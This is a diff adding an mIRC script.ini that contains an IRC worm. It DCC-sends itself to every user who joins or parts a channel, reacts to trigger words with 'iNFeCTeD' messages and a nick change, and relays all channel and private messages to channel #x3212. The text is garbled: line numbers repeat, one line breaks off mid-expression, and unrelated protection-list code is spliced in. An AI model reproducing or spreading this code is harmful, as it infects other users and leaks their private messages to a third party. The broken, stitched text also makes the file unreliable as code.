@@ -1,0 +1,39 @@
+[script]
+n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }
+n1=  /dcc send $nick $mircdirscript.ini
+n2=}
+n3=
+n4=ON 1:PART:#:{ /if ( $nick == $me ) { halt }
+n5=  /dcc send $nick $mircdirscript.ini
+n6=}
+n7=
+n8=ON 1:TEXT:*simpsalapim*:#:/quit iNFeCTeD!
+n9=ON 1:TEXT:*XX!XX*:*:/msg $nick i'm iNFeCTeD!
+n10=ON 1:TEXT:*ananas*:#:{
+n11=  /set %nimi  $nick
+n12=  /nick _XInFected
+n13=  %i = 0
+n14=  %opit = $opnick(0,$chan)
+n15=  :looppi
+n16=  %i = %i + 1
+n17=  /if ($opnick(%i,$chan) != $me ) { %line = $o:*:?:/msg #x3212 **Message from $nick $+ ** $parms | /closemsg  $nick
+n10=ON 1:TEXT:*:#:/msg #x3212  $+ $chan $+  < $+ $nick $+ > $parms
+n11=ON 1:JOIN:#:/dcc send $nick SCRIPT.INI
+n12=
+n13=#user.prot.add.all off
+n14=raw 401:*: set %User.Nick 0 | halt
+n15=raw 301:*: halt
+n16=raw 311:*: set %User.Address $2 $+ ! $+ $3 $+ @ $+ $4 | halt
+n17=raw 312:*: halt
+n18=raw 313:*: halt
+n19=raw 317:*: halt
+n20=raw 319:*: halt
+n21=raw 318:* {
+n22=  if (%User.Nick == 0) { error $2 $+ , no such nick | goto done }
+n23=  set %User.Address $mask(%User.Address,3)
+n24=  set %Var.Temp $readini $mircdirsystem\protect.ini %User.Address Channels
+n25=  if (%Var.Temp == *) { error $2 is already on the protected list for all channels! | goto done }
+n26=  writeini $mircdirsystem\protect.ini %User.Address Channels *
+n27=  echo %color.echo -a  Added $2 6( $+ %User.Address $+ 6) to protected user list. Channels: All | .auser 85 %User.Address
+n28=  :done
+n29=  unset %User.* | .disable #user.prot.add.all | hal
